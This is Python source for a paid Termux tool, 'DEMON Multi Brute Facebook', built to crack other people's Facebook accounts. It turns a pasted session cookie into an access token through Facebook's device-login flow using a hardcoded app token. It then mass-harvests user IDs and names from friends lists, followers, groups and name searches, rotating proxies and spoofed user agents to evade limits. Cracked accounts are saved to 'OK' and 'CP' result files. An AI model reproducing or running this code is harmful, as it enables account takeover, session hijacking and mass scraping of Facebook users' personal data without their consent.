#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re,platform 
import urllib3,rich,base64
from rich.table import Table as me
from rich.tree import Tree
from rich.console import Console as sol
from time import time as todd
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
try:
        import rich
except ImportError:
        cetak(nel('\t• Installing Rich Module •'))
        os.system('pip install rich')
try:
	import requests
except ImportError:
	cetak(nel('\t• Installing Requests Module •'))
	os.system('pip install requests && pip install mechanize ')
	
###----------[ IMPORT MODULE RICH ]---------- ###
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()
sys.stdout.write('\x1b]2; DMBF | DEMON Multi Brute Facebook\x07')
	
####colour##₦
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
color_panel = "#00C8FF"

#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mCyberDemon404')
prox=open('.prox.txt','r').read().splitlines()

#-----------------------[DATE CHECKER]-----------------------#
def Jawnx(idf):
    if len(idf)==15:
        if idf[:10] in ['1000000000']       :hking = ' 2009'
        elif idf[:9] in ['100000000']       :hking = '~> 2009'
        elif idf[:8] in ['10000000']        :hking = '~> 2009'
        elif idf[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:hking = '~> 2009'
        elif idf[:7] in ['1000006','1000007','1000008','1000009']:hking = ' 2010'
        elif idf[:6] in ['100001']          :hking = '~> 2010/2011'
        elif idf[:6] in ['100002','100003'] :hking = '~> 2011/2012'
        elif idf[:6] in ['100004']          :hking = '~> 2012/2013'
        elif idf[:6] in ['100005','100006'] :hking = '~> 2013/2014'
        elif idf[:6] in ['100007','100008'] :hking = '~> 2014/2015'
        elif idf[:6] in ['100009']          :hking = '~> 2015'
        elif idf[:5] in ['10001']           :hking = '~> 2015/2016'
        elif idf[:5] in ['10002']           :hking = '~> 2016/2017'
        elif idf[:5] in ['10003']           :hking = '~> 2018/2019'
        elif idf[:5] in ['10004']           :hking = '~> 2019/2020'
        elif idf[:5] in ['10005']           :hking = '~> 2020'
        elif idf[:5] in ['10006','10007','']:hking = '~> 2021'
        elif idf[:5] in ['10008']           :hking = '~> 2022'
        elif idf[:5] in ['10009']           :hking = '~> 2023'
        else:hking=''
    elif len(idf) in [9,10]:
        hking = '~> 2008/2009'
    elif len(idf)==8:
        hking = '~> 2007/2008'
    elif len(idf)==7:
        hking = '~> 2006/2007'
    else:hking=''
    return hking

for t in range(10000):
	a=random.choice([str(random.randint(4,7))+'.'+str(random.randint(0,9))+'.'+str(random.randint(0,9)),'8.0.0','8','9','10','11','12','13'])
	b=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
	c=random.randrange(111111,210000)
	d=random.randrange(11,19)
	e=random.randrange(73,100)
	f=random.randrange(4200,4900)
	g=random.randrange(40,150)
	random1=random.choice(['SM-M236B','SM-A037G','SM-J701MT','SM-A115U','SM-G610M','SM-J530F','SM-A307FN','SM-A405FN'])
	random2=random.choice(['SM-J415N','SM-R765T','SM-A730F','SM-A605G','SM-J610F','SM-N9750','SM-G935A'])
	brayen1=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	brayen2=f'Mozilla/5.0 (Linux; Android {a}; {random2} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	uaku2 = random.choice([brayen1,brayen2])
	ugen.append(uaku2)

def think():
	name = input('Enter Your Real name or fuck off : ')
	open('..txt','w').write(name)
	uno = open('..txt','r').read().splitlines()
	pass
	
	
update = requests.get("https://raw.githubusercontent.com/CyberDemon404/DEMO2/main/use.py")
uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = ""
log = "D3M02"
bumper = id+bxd+xp+log
myweb2 = requests.get("https://raw.githubusercontent.com/CyberDemon404/DEMO2/main/use.py").text

def demonbuy():
        try:
                os.system('clear')
                banner()
                x = requests.get('https://raw.githubusercontent.com/CyberDemon404/DEMO2/main/use.py').text
                if str("upppdate") in update:
                        os.system('clear')
                        exit('script is in update / maintanance be patient ')
                elif str("res-sseett") in update:
                        os.system('')
                        os.system('')
                        os.system('')
                        exit('Dont Try To Bypass')
                elif bumper in myweb2:
                        login()
                else:
                        os.system("clear");banner()
                        print(f"   Your Device License Key Is Not Approved")
                        print(50*"-")
                        print(f" Key : {bumper}")
                        print(50*"-")
                        print(f" Note :Tool is Paid & We Accept All Types Of PAyment  Method .")
                        print(50*"-")
                        print(f" 14-Days Price : ₦7,000")
                        print(f" 1-Month Price : ₦15,000")
                        print(f" Price is Negotiable. We understand the Economy.")
                        print(50*"-")
                        input("[Press Enter To Send Key To Admin]")
                        os.system(f"termux-open-url https://wa.me/+2348178406817?text={bumper}")
                        demonbuy()
        except requests.exceptions.ConnectionError:
                exit(' No internet connection ..')

def rrrr():
        if bumper in myweb2:
                pass
        else:
                demonbuy()
def xchker():
    pass    
    

#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ COLOR-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # YELLOW +
h = '\x1b[1;92m' # GREEN +
hh = '\033[32m' # GREEN -
u = '\033[95m' # PURPLE
kk = '\033[33m' # YELLOW -
b = '\33[1;96m' # BLUE -
p = '\x1b[0;34m' # BLUE +
asu = random.choice([m,k,h,u,b])
#--------------------[CONVERTER-MONTH ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June' ,'7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June' ,'07':'July','08':'August','09':'September','10':'October','11':'November','12':'December'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	WAR = random.choice(["[d_pink]","[b green]","[b cyan]","[b blue]","[b magenta]","[b red]", "[b grey]"])
	cetak(nel(f'''[b magenta]●[b yellow] ●[b green] ●{WAR}

▓█████▄ ▓█████  ███▄ ▄███▓ ▒█████   ███▄    █ 
▒██▀ ██▌▓█   ▀ ▓██▒▀█▀ ██▒▒██▒  ██▒ ██ ▀█   █ 
░██   █▌▒███   ▓██    ▓██░▒██░  ██▒▓██  ▀█ ██▒
░▓█▄   ▌▒▓█  ▄ ▒██    ▒██ ▒██   ██░▓██▒  ▐▌██▒
░▒████▓ ░▒████▒▒██▒   ░██▒░ ████▓▒░▒██░   ▓██░
 ▒▒▓  ▒ ░░ ▒░ ░░ ▒░   ░  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
 ░ ▒  ▒  ░ ░  ░░  ░      ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
 ░ ░  ░    ░   ░      ░   ░ ░ ░ ▒     ░   ░ ░ 
   ░       ░  ░       ░       ░ ░           ░ 
 ░                                            

[[b green]+[white]] Made By   : [italic]Nigerian Cracker[/]
''',title="CYBER DEMON 404",subtitle="Version 5.0"))
#--------------------[ BAGIAN-MASUK ]--------------#
	
	
def login123():
	os.system('clear')
	banner()
	cetak(nel(f"[01] Login Via Cookie [[bold green] ON [bold white]]\n             [03] Menu Bot Sc [[bold green] ON [bold white]]\n[02] Menu Crack Without Login [[bold green] ON [bold white]]\n               [04] Check Crack Result [[bold green] ON [bold white]]",width=90,title=f"[bold green]Menu Bot",padding=(0,2),style=f"bold white"))
	bryn = input(f' ╰─  Choose Menu : ')
	if bryn in ['1','01']:
		login_lagi334()
	elif bryn in ['2','02']:
		lainnya()
	elif bryn in ['3','03']:
		os.system("python bot.py")
	elif bryn in ['4','04']:
		result()
	else:
		print(' ╰─  Option not found ')
		time.sleep(5)
		back()
		
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login123()
		except requests.exceptions.ConnectionError:
			li = ' ╰─  Problem Internet Connection, Check And Try Again'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login123()
		
def login_lagi334():
	try:
		cetak(nel('Login Fresh ',width=90,style=f"bold white"))
		your_cookies = input(' ╰─  Enter Cookie : ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'How do you want to log in to Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print(" ╰─  Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Success!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"\n ╰─  Token : {access_token}")
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							print("\n ╰─  Login Successful | Run python codex23.py");pass
			except Exception as e:
				print(" ╰─  Cookies Invalid")
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass
	        


#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Expired ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	print('')
	atsu=[]
	atsu.append(nel('[01].Crack Public    \n[02].Crack Followers\n[03].Crack Group',width=38))
	atsu.append(nel('\n[04].File Making [manual & auto] [Login]    \n[05].File making [New method] [No login]\n[06].Random cloning\n[07].FB 2FA',width=39))
	atsu.append(nel('[08].Crack File\n[09].Check Result\n[00].Remove Login',width=40))
	
	CON.print(col(atsu))
	atsuna = input('  >+< Choose : ')
	if atsuna in ['1','01']:dump_massal()
	elif atsuna in ['2','02']:dump_follower()
	elif atsuna in ['3','03']:grup()
	elif atsuna in ['8','08']:crack_file()
	elif atsuna in ['9','09']:result()
	elif atsuna in ['4','04']:os.system("python dump.py")
	elif atsuna in ['5','05']:os.system("python newdump.py")
	elif atsuna in ['6','06']:os.system("python random1.py")
	elif atsuna in ['7','07']:os.system("python 2fa.py")
	elif atsuna in ['0','00']:
		os.system('rm -rf .token.txt & rm -rf .cookie.txt')
		print('>> Successful Logout+Delete Cookie ')
		exit()
	else:
		print('>> Choose Correct Asu')
		back()
def error():
	print(f'{k}>> Sorry, this feature is still being fixed {x}')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'>> 1. Your {h}OK{x} result ')
	print(f'>> 2. Your {k}CP{x} result ')
	print('>> 3. Back	')
	kz = input(f'\n>> Choose : ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('>> File Not Found ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('>> You Dont Have CP Results ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'>> %s. %s ({k} %s {x}Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n>> Choose : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Select the Correct Option  ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> File Not Found ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}>> {k}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Click Enter{x} ]')
			back()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('>> File Not Found ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> You Dont Have File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'>> %s. %s ( {h}%s{x} Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'>> %s. %s ({h} %s {x}Idz )'%(cih,isi,(len(hem))))
			geeh = input(f'\nSelect : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Select the Correct Option  ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('>> File Not Found ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}>> {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Click Enter{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
		print('>> Select the Correct Option  ')
		back()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(f'  {m}>+< {x}How many ID : '))
	except ValueError:
		print('  Enter the number of the dump idz, instead of the letter  ')
		exit()
	if jum<1 or jum>100:
		print('>> Failed to Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'  {h}>+< {x}To '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('>> Signs of errors, lolz ')
			exit()
	try:
		print('')
		print(f'  {k}>+<{x} Total ID : {h}{x}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> Your signal is a dick ')
		back()
	except (KeyError,IOError):
		print(f'>>{k} Unlisted Friends {x}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	print('>> Type ( me ) if you want to crack your own followers ')
	pil = input('>> Enter Target Idz : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(f'>> Total Idz :{h} '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print('>> Internet Connection Problem ')
		exit()
	except (KeyError,IOError):
		print('>> Failed to Retrieve Target ')
		exit()
#------------------[ CRACK-GRUP ]-----------------#
balmond = b+"["+h+"✓"+b+"]"

def lah():
	print(f'\n{x}>> Total Idz Collected :{h} %s '%(len(id)))
	input(f'{x}>> [ {m}Click Enter {x}] ')
	print('')
	pass
	setting()
def grup():
	print('')
	id = input(f'{x}>> Enter Username Or Group Idz : ')
	ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
	miskinlu = {"user-agent": ua}
	url = "https://mbasic.facebook.com/groups/"+id
	ses = requests.Session()
	try:
		gn = parser(ses.get(url, headers=miskinlu).text, 'html.parser')
	except requests.exceptions.ConnectionError:
		print('>> Signal Lol what a Dick ')
		time.sleep(0.5)
		exit()
	berr = gn.find("title")
	berr2 = berr.text.replace(" | Facebook","").replace(" Public Group","")
	if berr2=='Login Facebook':
		print(" Limit Hit, Please turn on Airplane Mode And Try Again..")
		time.sleep(0.5)
		grup()
	elif berr2=='Error':
		alvino_xy('>> Group Not Found ')
		time.sleep(0.5)
		grup()
	else:pass
	print(f'{x}>> Group Name  : {b}%s'%(berr2))
	ggs = gn.find_all('table')
	ang = []
	for ff in ggs:
		anggo = ff.text
		bro = anggo.replace('Member','')
		try:
			mex = int(bro)
			jumlah = ang.append(mex)
		except:
			pass
	if len(ang)==0:
		print(" Member : -")
	else:
		print(f'{x}>> Member : {h}%s'%(ang[0]))
	grup1(url)
def grup1(urls):
	use = []
	ses = requests.Session()
	print(f'{x}>> Collecting Idz ')
	print(f'>> Click {k}Ctrl+C{x} To {m}Stop{x} Dump !!')
	while True:
		try:
			ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
			miskinlu = {"user-agent": ua}
			try:
				url = use[0]
			except:
				url = urls
			set = parser(ses.get(url, headers=miskinlu).text, "html.parser")
			bf2 = set.find_all('a')
			for g in bf2:
				css = str(g).split('>')
				if 'See More Posts</span' in css:
					bcj = str(g).replace('<a href="','').replace('amp;','')
					bcj2 = bcj.split(' ')[0].replace('"><img','')
			tes = set.find_all('table')
			for cari in tes:
				liatnih = cari.text
				spl = liatnih.split(' ')
				if 'file' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.replace(' ask a question .','')
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						print(("\r"+balmond+h+" { "+k+"Process Takes ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				elif '>' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.split(' > ')[0]
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						xy = random.choice([m,k,h,u,b,x])
						print(f'\r	———>> {x}({xy} %s {x}) <<———'%(len(id)), end="");sys.stdout.flush()
				else:
					continue
			try:
				link_ = bcj2
				use.insert(0,'https://mbasic.facebook.com'+link_)
			except:
				girang = set.find('title')
				girang2 = girang.text.replace(" | Facebook","").replace(" Public Group","")
				if girang2=='Enter Facebook':
					pass
				else:
					lah()
		except requests.exceptions.ConnectionError:
			try:
				time.sleep(31)
			except KeyboardInterrupt:
				lah()
		except KeyboardInterrupt:
			lah()
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('/sdcard/DEMON-DUMP')
	except FileNotFoundError:
		print('>> File Not Found ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('')
		cetak(nel('white][[cyan]•[white]] If You Want To Use This Feature Follow The Requirements Below\n[[green]1[white]] Create a Dump Id File First\n[[green]2 [white]] Once finished, put the files in the folder[yellow] DEMON-DUMP[white] in your internal storage\n[[green]3[white]] Then return the script!Just select feature number[yellow] 4 [white] This '))
		kontol = input('\n>> Do you understand ( Y/t ) ')
		if kontol in ['']:
			print('>> Choose the Right Folder ')
		elif kontol in ['y','Y']:
			print(f'\n[{h}√{x}] Thank God Youre Really Smart ')
			time.sleep(3)
			back()
		elif kontol in ['t','T']:
			print(f'\n[{k}x{x}] You are such an idiot  ')
			time.sleep(3)
			exit()
		print('>> You Dont Have Dump Files ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/DEMON-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'>> %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print('>> %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input('\n>> Select : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f'{k}>> Choose the Correct Option  {x}')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/DEMON-DUMP/'+geh,'r').read().splitlines()
		except:
			print('>> File Not Found, Try Again Later ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()
		
		
def lainnya():
	cetak(nel(f"[01] Crack Username [[bold green] ON [bold white]]                  [03] Crack File [[bold green] ON [bold white]]\n[02] Crack Followers [[bold green] ON [bold white]]                 [04] Crack Email [[bold green] ON [bold white]]",width=90,title=f"[bold green]Menu Crack",padding=(0,8),style=f"bold white"))
	bray = input(f' ╰─  Choose Menu Crack : ')
	if bray in(''):
		print(' ╰─  Option invalid ');back()
	if bray in('1','01'):
		crack_nama()
	elif bray in('2','02'):
		pengikut()
	elif bray in('3','03'):
		crack_email()

###----------[ DUMP PENGIKUT ]---------- ###
def pengikut():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	ses = requests.Session()
	cetak(panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",width=90,padding=(0,7),style=f"bold white"))
	akun = console.input(f' ╰─  Enter Id Target : ')
	try:
		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:
			    id.append(pi['id']+'|'+pi['name'])
			    sys.stdout.write(f"\r ╰─  Collecting {len(id)} Idz...");sys.stdout.flush()
			    time.sleep(0.0002)
			except:continue
		print("\r")
		cetak(panel(f"Berhasil Mengumpulkan {len(id)} Idz",width=90,padding=(0,22),style=f"bold white"))
		setting()
	except requests.exceptions.ConnectionError:
		print(f" ╰─ Internet Connection Error ")
		time.sleep(3);exit()
	except (KeyError,IOError):
		print(f" ╰─  Gagal Dump Id, Kemungkinan Akun Private")
		time.sleep(3);exit()

#----------------------[ CRACK USERNAME ]----------------------#
def crack_nama():
	nama = []
	custom = [" iqbal"," kami"," siska"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," tiara"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
	custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","albert ","naura ","naira ","mancung ","dewi ","josen ","johan ","slot ","sharil ","hendrik ","edo ","ridho ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]
	cetak(panel(f"    Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 5.000 Username",width=90,padding=(0,2),style=f"bold white"))
	nam = console.input(f' ╰─  Masukan Nama : ').split(",")
	for ser in nam:		
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=5) as thread:
		for id in nama:
			thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	setting()
		
def cari_nama(link):
	r = parser(ses.get(str(link)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in id:pass
			else:id.append(bo)
	link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
	if(link):
